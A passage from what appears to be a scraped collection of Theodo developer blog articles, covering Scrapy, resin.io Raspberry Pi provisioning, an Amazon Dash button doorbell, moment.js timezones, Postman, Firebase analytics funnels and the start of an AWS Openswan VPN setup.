CrawlSpider, another Scrapy class that provides a dedicated mechanism for following links by defining a set of rules directly in the class.\nYou can look at the documentation here.\nIn the parse_article function, we retrieved all the text content but that also includes the aside where we have the author of each article.\nTo remove it from the output, you can change the xpath by response.xpath(\".//div[@class='entry-content']/descendant::text()[not(ancestor::aside)]\").\nYou can see that the output of the scraper is not perfect as we see some unorthodox characters like \\r, \\n or \\t.\nTo exploit the data, we would first need to clean what we retrieved by removing unwanted characters.\nFor example, we could replace \\t characters to a space with a simple content.replace('\\r', ' ').\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tThomas Mollard\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAn IOT Container Engine\nWhen preparing a company-wide IOT(Internet of Things) hackathon I wanted to ensure all the Raspberry Pi devices we planned to use were ready for people to throw code at without needing monitors, keyboards, setting up ssh keys and getting frustrated by time wasted to getting to hello world.\nI thought, we must have got further than this by now, with AWS I can spin up a complete load balanced server anywhere in the world in a matter of minutes\u2026\nAnd we have got further\u2026\nResin.io brings simplicity to one of the most challenging and for me boring aspects of IOT; provision of devices. More than simplifying life for developers who want to build awesome products, it provides the tools to deal with real life IOT applications at scale.\u00a0 \u2013 For example fleet wide deployments ready at the click of a button.\nSo let\u2019s get to Hello World.\nGo to resin.io and sign up for free.\nCreate a new application, selecting the IOT device you want to use (note this does not seem to be editable later), in our case a Raspberry Pi 3.\n\nNow click, add a device, keep the defaults and click download the OS.\n\nWhile that\u2019s downloading, install etcher.io. Etcher. An open source\u00a0tool from resin.io that allows you to easily burn images.\nNow plug in your SD card, open Etcher and select the file you downloaded for the SD card you just plugged in and wait\u2026\nWhile your waiting let\u2019s make an ssh key for our resin account:\nssh-keygen -t rsa -b 4096 -C \u201cYOUR_EMAIL_ADDRESS\u201d\nGive a file name at the prompt.\nNow copy the ssh public key: pbcopy < ~/.ssh/id_rsa_theodo_pi.pub \nGo onto the dashboard and click add manual ssh key (or you could import keys from GitHub, but that feels weird to me!)\nNow, back to the main event!\nGo back to the resin.io dashboard and refresh.\n\nYou should now see your device!\nClick on the device and you can open the logs and console of the device or docker container inside.\nNow let\u2019s say hello\nResin provide a simple hello world boilerplate for the PI3 so lets clone:\ngit clone https://github.com/resin-io-projects/simple-server-node.git\nWe can now cd into this and add a remote directory as shown in the top right of the dashboard:\u00a0git remote add resin USERNAME@git.resin.io:USERNAME/APPNAME.git\nThe first push will take some time (5 min), but docker container sharing will speed this up next time.\n\u00a0\nAlso, the completion mascot is awesome!\nNow, got to the IP address of your device in your browser and see the amazing words \u201cHello World!\u201d.\nNote: Depending on the config you used you could have set public HTTP forwarding for this device. This is a great feature but depending on your network could be a vulnerability to your home/office and I\u00a0advise you close this unless you need it. You can turn this off in the actions section of the dashboard.\nLet\u2019s get personal\n\u00a0\nHello\u00a0world is great, but I prefer to be called by name. So time to push an update.\nEdit the server.js file to say \u201cHello Ben\u201d (or your name if you prefer).\nAgain, git push resin master and you\u2019ll have your update in no time.\n\u00a0\nSo this is way easier than it used to be, but if it\u2019s still to slow a feedback loop for you how about hot reloading of your local code to one of your fleet devices?\nResin Sync to the rescue https://docs.resin.io/tools/cli/#sync-uuid-\nIn Conclusion:\nResin can takes the headache out of basic IOT provisioning.\nAt scale, it can allow a whole fleet of devices to be provisioned, updated, managed and debugged.\nThe use of docker allows a consistent build process across projects and fast deployments.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA few years ago Amazon came out with the Amazon Dash Button, a small internet connected button that can be used to reorder common household items. Such a small, cheap and well-made internet connected button seems like a godsend for the IOT developer community \u2013 but they are not intended for use outside of product ordering. Amazon did release an IOT version of the Dash button, but at 4 times the price point it\u2019s less attractive.\nCould we intercept the network requests from Dash buttons and trigger our own custom events? An IOT doorbell, office coffee emergency button\u2026 That\u2019s the challenge we set ourselves.\nConnect the Dash Button to WiFi\nOpen up your Amazon app on IOS or Android, turn on Bluetooth and add the device. Be sure to quit the process once it\u2019s connected to the internet but before you select a specific product!\nNow your button is online.\nGetting the MAC address of the button\nThe Dash Button is asleep most of the time, meaning when you press the button it must connect to the LAN over WiFi and then send its API request. Therefore it needs to acquire an IP address.\nOn an IPv4 network, Dynamic Host Configuration Protocol (DHCP) is used to get an address, and this process includes an Address Resolution Protocol (ARP) request. Our plan is to place a Raspberry Pi device on the LAN to watch for such ARP requests from our Dash buttons, allowing us to then trigger actions.\nFrom our laptop on the same network, we can watch broadcast packets on the network using tcpdump.To watch for ARP request packets we can run:\n\r\ntcpdump -ve arp | awk '{print $2}\r\n\n(on Mac)\n\nthe -v option gives us a verbose output\nthe -e option displays the MAC addresses\nthe awk script prints out just the MAC address column.\n\nThere will likely be many busy devices cluttering up your network so run this, press the dash button, wait 30 seconds and then look at the list of MAC addresses captured.\nPart of the MAC address specification includes the manufacturers ID so we can go to an online tool such as macvendors.com and lookup each of the addresses we found. The one that has the manufacturer as Amazon Technologies Inc. is what you\u2019re looking for. Make a note of the address in question, and if you\u2019re looking to setup multiple devices use the same process.\nIf you have other Amazon devices on your network this process may take more trial and error.\nTriggering an action\nWe can write a short bash script, using a similar approach to above, that will trigger an action whenever the button is pressed.\n\r\n#!/bin/bash\r\nbutton='ENTER_THE_MAC_ADDRESS'\r\ntcpdump -l -n -i en0 | while read b; do\r\n  if echo $b | grep -q $button ; then\r\n    echo \"Trigger Action\"\r\n  fi\r\ndone\r\n\n\nbutton is the MAC address from the step above\ntcpdump is passed an interface using the -i option. en0 or eth0 will likely work for you, but use ifconfig to find you LAN ethernet interface.\nWe\u2019re piping into a while loop to get around some issues with evaluating our post grep action.\n\nWe can now trigger any action based on the pressing of the button. This could be an SMS using Twilio, an email, voice announcement using espeak, an AWS Lambda function\u2026 the world\u2019s your limit!\nMaking a doorbell\nIf we want our doorbell to drop us an SMS we can sign up for Twilio\u2019s programmable SMS service.\nThen we can adapt our script to include a curl request as follows:\n\r\n#!/bin/bash\r\nbutton='ENTER_THE_MAC_ADDRESS'\r\n\r\ntcpdump -l -n -i en0 | while read b; do\r\n  if echo $b | grep -q $button ; then\r\n    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \\\r\n    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \\\r\n    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \\\r\n    --data-urlencode 'Body=Let Me In! \ud83d\udeaa' \\\r\n    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY\r\n    echo \"There is someone at the door\" | say\r\n  fi\r\ndone\r\n\n\n$YOUR_ACCOUNT_ID you can get from the Twilio site.\n$YOUR_PHONE_NUMBER is the number of the phone to be texted when the doorbell is rung.\n$YOUR_TWILLIO_PHONE_NUMBER is the phone number given to you by Twilio.\n$ YOUR_TWILLIO_API_KEY you can get from the Twilio site.\n\nThe Twilio getting started console can help you build such a request body.\nDeploying to the Raspberry Pi\nPro Tip: You\u2019ll have better performance regarding latency and reliability with a direct ethernet connection to the LAN router.\nResin.io is an amazing tool when it comes to IOT provisioning. Follow my steps in the article, \u2018IOT Provisioning As A Service\u201d, I wrote the day before the hackathon on setting up a Raspberry Pi without the headache. The next steps will assume you\u2019re using resin.io with the docker image from that article.\nEdit the Dockerfile.template to install tcpdump and curl by adding the following lines:\n\r\nRUN apt-get update\r\nRUN apt-get install tcpdump curl\r\n\nNow change the run line at the bottom of the template to CMD [\u201c./main.sh\u201d] where \u201cmain.sh\u201d is the name of the script.\nWe can now git add and commit to the master branch, and git push to your remote resin repository as discussed in the article from above.\nOn the resin.io dashboard we can watch the deployment and debug any issues (e.g. the interface name eth0 or en0 is wrong for the Pi environment).\nPress the button\u2026\nAnd\u2026\nGet several notifying text messages.\nDealing with multiple notifications\nSeveral ARP requests can be received when the button is pressed due to the nature of the DHCP handshake. You can use a sleeping period to prevent such issues, but for this proof of concept the repeats are fine for now. (Keep an eye on this space)\nGetting chatty\nTaking the concept further we can connect our Raspberry Pi to a speaker and use the espeak library to trigger text to speech notifications.\nOnce again edit the Dockerfiler.template to add:\n\r\n'RUN apt-get install espeak'\r\n\nNow we can add the following to the main.sh:\n\r\n'echo \"There is someone at the door\" | espeak -v en-sc -a 200'\r\n\nCoffee time \u2615\ufe0f\nTaking the idea to another level let\u2019s build a \u201ccoffee emergency button\u201d.\nIn our office when the coffee runs out, it\u2019s a big problem\u2026\n\n\r\nNo coffee => slow devs => bad code.\r\n\nWe\u2019re going to build an internet connected coffee emergency button that will go on top of the emergency coffee tin, sending an audio alert to the office and a text message to the coffee buyer.\nTo do this we need to add another MAC address to our script for the new button and change our main.sh file as follows:\n\r\ntcpdump -l -n -i en0 | while read b; do\r\n  if echo $b | grep -q $button ; then\r\n    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \\\r\n    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \\\r\n    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \\\r\n    --data-urlencode 'Body=Let Me In! \ud83d\udeaa' \\\r\n    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY\r\n    echo \"There is someone at the door\" | say\r\n  fi\r\n  if echo $b | grep -q $coffee_button ; then\r\n    curl 'https://api.twilio.com/2010-04-01/Accounts/$YOUR_ACCOUNT_ID/Messages.json' -X POST \\\r\n    --data-urlencode 'To=$YOUR_PHONE_NUMBER' \\\r\n    --data-urlencode 'From=$YOUR_TWILLIO_PHONE_NUMBER' \\\r\n    --data-urlencode 'Body=ORDER COFFEE \u2615\ufe0f\ud83d\udea8' \\\r\n    -u $YOUR_ACCOUNT_ID:$YOUR_TWILLIO_API_KEY\r\n    echo \"POTENTIAL COFFEE EMERGENCY AVERTED, BUYER NOTIFIED.\" | say\r\n    echo \"That was a close one.\" | say\r\n  fi\r\ndone\r\n\nConclusion\nThis solution was built during a Theodo Hackathon and has room for improvement, yet it does serve as a fully functional doorbell in our office and we\u2019ve not run out of coffee since!\nHopefully you learned some networking, have ideas for your own projects and will build your own buttons.\nPlease leave your ideas and results in the comments below.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tHandling dates when dealing with timezones is a difficult task.\nFortunately for us, there are many libraries like moment.js helping us to handle common issues like timezones, daylight saving time, manipulation and date formatting.\nI recently encountered several issues in displaying dates in the correct format and timezone whilst working on a mobile application project.\nAn external server which sends us local date time as a string and timezone like this:\n\r\n{\r\n  localDateTime: 'YYYY-MM-DD HH:mm', // Not in UTC\r\n  timezone: 'Indian/Reunion', // Or 'Europe/Paris''\r\n}\r\n\nI had to display and manipulate these dates. But before that, I needed to parse and store them. To be more specific with the  about the use case is drawn above a diagram of the date flow in my application.\n\nIn this article, I will show you how to deal with common difficulties in date handling with one of the most standard libraries: moment.js.\nWhat is moment ?\nMoment is a very comprehensive and popular library for handling dates. It can be thought of as the standard in javascript. It provides functions to parse, manipulate and display dates and times. Moment-timezone.js adds functions to handle dates and times for different countries.\nOn the other hand, one should be aware that moment dates are mutable. I will deal with this issue in the manipulation part of this article.\nI will focus on explaining the flow of date handling in a full JS application. I will also shed light on some tricky points of moment.\nTime zone\nSo, what is a timezone?\nTime zone is a region of the globe that observes a uniform standard time which are offset from Coordinated Universal (UTC). A time zone sets the time according to the distance from the prime meridian. Some time zones change their offset during the year. This is called daylight saving time (DST).\nIn the map above, you can see the time in every part on the world corresponding to the timezone without DST.\n\nNote: There is no time difference between UTC and Greenwich Mean Time (GMT). But UTC is a standard time whereas GMT is a timezone.\nHow to store a date\nParse the date string\nWhen you receive a date string, you should first parse it to get the correct datetime before storing it in your database.\nAccording to the format\nMoment provides a function moment(date: string, format: string) to convert a string into a moment object according to the format. \n\r\nconst moment = require('moment')\r\n\r\nconst dateToStore = '2018-01-27 10:30'\r\nconst momentDate = moment(dateToStore,'YYYY-MM-DD HH:mm')\r\n// momentObject(2018-01-27T10:30:00.000)\r\n\nAccording to the timezone\nWe created a moment object which corresponds to the string. But let\u2019s see the result in our example with a server A in Reunion (UTC+04:00) and a server B in France (UTC+01:00). If A sends a string  2018-01-27 10:30 to B, A wants to share 2018-01-27 6:30+00:00, but B will understand 2018-01-27 9:30+00:00.\n\nBy default, moment parses the date with the machine local time (either the user or the server). You can get the local utcOffset in minutes with moment.utcOffset(). So if you don\u2019t specify the timezone, the date will not be correctly parsed. You had to specify it using moment-timezone instead of moment.\n\r\n const moment = require('moment')\r\n const momentTz = require('moment-timezone')\r\n\r\n const dateToStore = '2018-01-27 10:30'\r\n moment().utcOffset(); // 60 minutes\r\n const timeZone = 'Indian/Reunion' // 'UTC+04:00'\r\n\r\n const momentDate = moment(dateToStore,'YYYY-MM-DD HH:mm')\r\n //momentObject(2018-01-27T10:30:00+01:00)\r\n \r\n const momentDateTz = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone)\r\n //momentObject(2018-01-27T10:30:00+04:00)\r\n\nBetter cases\nIn this case, the external API sends the date without any timezone and not in UTC. The best practice is to send the date in UTC or at least with the offset from UTC so that the receiver does not have to handle timezone. In these better cases, you can parse the date string using moment.utc() or moment.parseZone() or either moment(date,'YYYY-MM-DD HH:mm:ssZZ').\n\r\nconst moment = require('moment')\r\n\r\nconst receveidDateInUTC= '2018-01-27 6:30:00+00:00'\r\nconst receveidDateWithTimeZone = '2018-01-27 10:30:00+04:00'\r\n\r\nmoment(receveidDateInUTC,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T7:30:00+01:00)\r\n\r\nmoment.utc(receveidDateInUTC,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T6:30:00+00:00)\r\n\r\nmoment(receveidDateWithTimeZone,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T7:30:00+01:00)\r\n\r\nmoment.parseZone(receveidDateWithTimeZone,'YYYY-MM-DD HH:mm:ssZZ')\r\n// momentObject(2018-01-27T10:30:00+04:00)\r\n\nAs you can see, there are a number of ways to parse the same date.\nThat is why it is a best practice to store and send your date in UTC.\nUse Coordinated Universal Time (UTC)\nTo make the data portable I would recommend storing the datetime in UTC. It is the international time standard that expresses dates without offsets and does not adjust for daylight savings. To do this, I use the moment.utc()  function which converts a moment object in UTC.\n\r\nconst momentTz = require('moment-timezone')\r\n\r\nconst dateToStore = '2018-01-27 10:30'\r\nconst timeZone = 'Indian/Reunion' // 'UTC+04:00'\r\n\r\nconst momentDateTz = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone)\r\n// momentObject(2018-01-27T10:30:00+04:00)\r\n\r\nconst momentDateTzUTC = momentTz.tz(dateToStore,'YYYY-MM-DD HH:mm',timeZone).utc()\r\n// momentObject(2018-01-27T06:30:00+00:00)\r\n\nFinally you can store the date as a TIMESTAMP_WITH_TIMEZONE attribute in your database.\nDisplay a date\nSet the local time\nI created a service in my application which provides a function to format dates. We received the date from our back-end in UTC. But depending on where the person is, the locals are not the same. The locals contain informations about linguistic, cultural, and technological conventions and standards. That is why the first thing to do is to set the local time. I got the local time with the library react-native-device-info and then I set the local time with moment.locale().\n\r\nconst moment = require('moment')\r\nconst DeviceInfo = require('react-native-device-info');\r\n\r\nconst date = '2018-01-27T10:30:00+00:00'\r\nmoment.locale() // 'fr'\r\nmoment(date).format('DD MMMM') // 27 Janvier\r\n\r\nconst local = DeviceInfo.getDeviceLocale() // 'en'\r\nmoment.locale(local)\r\n\r\nmoment(date).format('DD MMMM') // 27 January\r\n\nFormat the date\nFinally, I create one function for each format I had.\n\r\nconst plainTextDateTime = dateTime => {\r\nreturn moment(dateTime).format('DD MMMM HH:mm a') // 27 January 10:30 am\r\n}\r\nconst getDate = dateTime => {\r\nreturn moment(dateTime).format('DD MMMM') // 27 January\r\n}\r\nconst getTime = dateTime => {\r\nreturn moment(dateTime).format('HH:mm a') // 10:30 am\r\n}\r\n\nDate manipulation\nMoment provides a core of manipulating functions as comparison, addition and subtraction functions. It is really easy to use. The main issue is that moment objects are mutable.\nFor example, if you want to know if a date is in less than one hour, you have two options :\n\r\n//option 1\r\nconst myDate = moment('2018-01-27 10:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');\r\nif (myDate.isBefore(moment().add(1,'hour'))) {\r\n// myDate is less than one hour\r\n}\r\n\r\n//option 2\r\nconst now = moment();\r\nconst myDate = moment('2018-01-27 6:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');\r\nif (myDate.subtract(1,'hour').isBefore(now)) {\r\n// myDate is less than one hour\r\n}\r\nconsole.log(myDate.format())\r\n// myDate has been muted => 2018-01-27T05:30:00+00:00\r\n\nWith the first option, you add one hour to moment() which is not a problem because you don\u2019t keep this value in memory. But with the second option, the value of myDate has changed which is not what you expected. You need to clone the value of myDate before manipulating this value.\n\r\n//option 2\r\nconst myDate = moment('2018-01-27 6:30:00+00:00','YYYY-MM-DD HH:mm:ssZZ');\r\nif (myDate.clone().subtract(1,'hour').isBefore(moment())) {\r\n// myDate is less than one hour\r\n}\r\nconsole.log(myDate.format())\r\n// myDate has NOT been muted => 2018-01-27T06:30:00+00:00\r\n\nConclusion\nTo conclude, a date has four states for the same data:\n\nThe received state as a string: parse the date in order to have the correct moment object\nThe storage state: store your data in UTC or at least with the time zone (TIMESTAMP WITH TIME ZONE in postgreSql)\nThe manipulation state: manipulate your dates with date object. If you are using moment, clone the object before manipulating.\nThe displaying state: set the local time and create a service to handle the different representation in your application.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Dufour\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\u00a0\nA postman, or letter carrier (in American English), sometimes colloquially known as a postie, is an employee of a post office or postal service, who delivers mail and parcel post to residences and businesses. Postman is also the name of a powerful graphical HTTP client helpful when working with APIs. I\u2019ll introduce a few tricks to get started with it!\nInstallation\nTo install Postman, go to this link and download the right version for the OS you use.\nHow to do a simple GET?\nLaunching the app, you should see the following screen:\n\nClick the Request button at the top-left of the modal, and you\u2019ll get on the Save Request screen.\nGive it a name, create a collection if you don\u2019t have any, select a collection and save it.\n\nFrom there, you\u2019ll be able to send a request. For exemple, you can hit the HTTPCat API. Enter the https://http.cat/[status_code] URL in the dedicated tab, with the status code of your choice. Press Send and you\u2019ll see the response just below.\n\nA first POST with a JSON body\nTo illustrate how to do a POST request, we are going to hit the https://jsonplaceholder.typicode.com/ URL, on the post route.\nSo from the same screen, select POST instead of GET, and enter the URL in the dedicated tab.\n\nThe API we\u2019re hitting enables us to send any JSON body, and sends it back in the response, adding it an id. Let\u2019s then send a random object.\nGo in the Body tab, check the raw radio button, and make sure that you selected JSON (application/json) on the dropdown on the right.\nThe body is a JSON object. There are a couple of things we need to be careful of when we write a JSON object, especially when you are used to writing JavaScript. Check here to know the traps not to fall in.\nIn the end we obtain this kind of POST requests:\n\nJust press Send and you\u2019ll have the response!\nUseful tricks POSTMAN offers\nHow to share one\u2019s collections\nExport them\nOn the left of your window, you have a list of your collections. Go over one with your mouse cursor, and you\u2019ll see three dots on the bottom-right of it. Click them, then click Export.\n\nYou\u2019ll get on a modal that asks you to choose the way you want to download your collection. Choose Collection v2, click Export and save it.\n\nImport them\nTo import a collection, click on Import at the top-right of your window, then get in your own files the json you want to import!\n\nHow to set environnement variables\nThe typical use case here is when you work with different environments. Let\u2019s say you develop an API which has a production, a staging and a development environments. For each of them, you want to set a Host and a token variable, to be able to authenticate.\nClick the wheel on the top-right of your screen, then select Manage Environments.\n\nClick Add.\n\nYou can now give a name to your environment, and set the variables you need. Click Update when this is done.\n\nYou can do this for each one of your environments, then you\u2019ll see them\u00a0in the Manage Environments tab.\n\nNow go back to the main screen, and fill your request with the variables using double curly brackets: {{ }}.\n\nBest way to create a request: copy as curl\nLet\u2019s say you want to reproduce a request done on a website. But this request is a very tricky one with, for example, authentication, complicated headers, a big body or a method you don\u2019t really know how to use.\nThen the best way to replicate this request is to basically copy the entire request directly from your browser.\nLet\u2019s say we want to get the post request of a research on https://giphy.com/. Open the browser development tools (Right click + Inspect on Chrome). Go in the Network tab and filter the requests by POST methods. Right click the one you are interested in, and select Copy as CURL.\n\nNow, go back to POSTMAN. On the top-left, click Import, and go in the Paste Raw Text tab. Paste what you copied, and press Import.\n\nNow Send the request and you\u2019ll have the answer!\nConclusion\nIf you want to keep going with Postman, you check this article about Postman Cloud, which explains you how to share and document your API.\nAnd\u00a0actually\u00a0there were technically only\u00a04 tricks in this article.. If you find any fifth\u00a0that would fit here, send it to me and I\u2019ll add it!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tElias Tounzal\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tGoogle Analytics\u00a0funnels are a standard way to monitor conversion on a typical purchase flow (e.g. buying a book on an ecommerce site, subscribing to an online service or taking out an insurance policy).\u00a0Google have moved to have Firebase as their standard mobile app analytics platform, and there is good support to get up and running in react-native with this (see react-native-firebase).\nMarketing departments are more used to working with traditional GA, and Google have therefore made it easy to\u00a0link a Firebase app to a GA app. You would think this would mean your marketing department can jump on an make a funnel in no time, but the funnel is based on events and although the default screen view is an event, the name of the screen is a parameter that can\u2019t be accessed when building the funnel (as of this point in writing).\nAssuming you\u2019ve set up firebase in your react-native project, the default screen view event to use would be something like:\nfirebase.analytics().setCurrentScreen(action.routeName);\nThis though would go through as a screen_view event and you would not be able to build a funnel:\n\nThere are two options to resolve this:\n\nMake an event per page, rather than just using the screen_view event and then you can build your funnel.\n Link to BigQuery and build your own funnel using the raw data\n\n\u00a0\nOption 1 will be the least strain on your marketing department, but means that past data you\u2019ve recorded in your app can\u2019t be used. As the marketing department is the primary user of analytics, option 1 is my suggestion and you can do adhoc work in BigQuery if you need past analysis. \nTo trigger an event per page using the same library as before the syntax is much the same: \nfirebase.analytics().logEvent(`Page_${action.routeName}`, {});\nPut this in the same point in your code as the original command (and keep the original one in case GA\u2019s tooling improves).\nTo get all the custom events available to build your funnel you need to go through the app manually triggering the events at least once, which is a pain, but your users could do this naturally for you if you can wait. (Note: although you see the events in the live view it can take a while for them to propagate up to the event options.)\nNow your marketing team can build funnels to their hearts content, and if your event logic is in your default navigator new pages will automatically appear as events ready for them to add to their funnel. \nHopefully GA\u2019s support for funnels will include parameter filters in the future, but until then this is a low cost workaround.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tSome third-parties only allow you to call their APIs if you are inside their network. This can make life difficult if your application is hosted on AWS.\nThe solution is to create a site-to-site VPN connection between your AWS Virtual Private Cloud (VPC) and the third-party\u2019s corporate network.\nThere are two common ways to do that:\n\nThe AWS way, using AWS Managed VPNs\nThe DIY way, using a software VPN\n\nI will touch on AWS Managed VPNs and then go through the steps of manually setting up a software VPN.\nA Quick Word on AWS Managed VPNs\nAWS has a Managed VPN service in which you create a Virtual Private Gateway in your AWS VPC, set up a Customer Gateway (representing the third-party) and create a VPN connection between the two.\n\nThis is by far the easiest and most robust solution.\nHowever, it has one major limitiations that might make it unsuitable for your needs:\nWith AWS Managed VPNs, the VPN tunnel can only be initiated from the Customer Gateway, i.e. the third-party\u2019s side!\nAs a result of this, there are only two situations in which you can use the AWS Managed VPN service:\n\nRequests are initiated from the third-party to your AWS hosts and your hosts only serve the response\nRequests are initiated from your AWS host to the third-party, but the third-party takes responsibility for keeping the VPN tunnel up.\n\nThey can do this by creating a \u201ckeep-alive\u201d ping that is constantly sending traffic through the tunnel and blocks it from going down.\nHowever, if anything were to interrupt the ping, your app will get cut off from their API and you will have to rely on the third-party to bring the connection back up. Therefore. this is not really a viable solution for production-grade.\n\n\n\nIf requests are initiated from your AWS servers to the third-party, and the third-party is unable or unwilling to take responsibility for keeping the tunnel open, then AWS-managed VPNs will not work and you will need to use an alternative solution.\nHow to set up a software VPN on AWS using Openswan\nThe rest of this article will walk you through setting up a site-to-site VPN connection using the Openswan software VPN.\nAt a high level, there are three steps:\n\nCreate an EC2 instance in AWS that will run the OpenSwan VPN\nInstall and set up OpenSwan on that EC2 instance\nDebug if it doesn\u2019t work on first try \ud83d\ude09\n\n\nPart 1) Create an AWS EC2 instance to run Openswan\n\nOpen up your AWS console, go to the EC2 services and create a new instance:\n\nUse the Amazon Linux AMI.\nMake sure you create the instance in the same VPC as your web servers (assumed to be 172.31.0.0/16 in the diagram).\nMake sure you create it inside a public subnet (172.31.1.0/24 in the diagram).\nThis will give it a direct route out to the internet through the VPC\u2019s Internet Gateway.\nAdd a Name tag (e.g. \u201cOpenswan VPN\u201d) and create a security group (e.g. \u201cOpenswan SG\u201d)\n\nThis is going to be our VPN instance which will be responsible for establishing the VPN tunnel to the third-party.\nIn the EC2 dashboard, select your new VPN instance and choose: \u201cActions -> Network -> Change Source/Dest Checking\u201d and make sure the status is \u201cDisabled\u201d.\u00a0If it isn\u2019t, click on \u201cYes, Disable\u201d.\n\nBy default, AWS blocks any request to and from an EC2 instance that don\u2019t have that instance as either the source or destination of the request.\u00a0We need to disable this since we will be routing requests through this instance that have the 3rd-party as destination.\n\n\nIn the details of the VPN instance, you can see its Private IP.\u00a0 Note this down.\nIn the diagram above we assume it\u2019s 172.31.1.15\nBy default, instances in public subnets are allocated a public IP by AWS.\nWe could use this public IP for our VPN instance but it is much safer to allocate an Elastic IP for your instance:\n\n\nOn the sidebar, select Elastic IPs and allocate an Elastic IP to the VPN instance.\n\n\n\nIn the diagram, we have denoted it as EIP\nWe need to adjust the security group of our instance to accept traffic from your application:\n\n\nAdd an inbound rule that accepts traffic from inside your VPC (172.31.0.0/16 in our case)\n\n\n\nThe type of traffic will depend on what type of API requests you want to make. For most cases, a rule for HTTP and another for HTTPS traffic should be enough. If you want to enable pinging, you should also allow TCP traffic.\nThere is no need to explicitly add corresponding outbound rules.\nFinally, we need to tell our VPC router to route all requests to 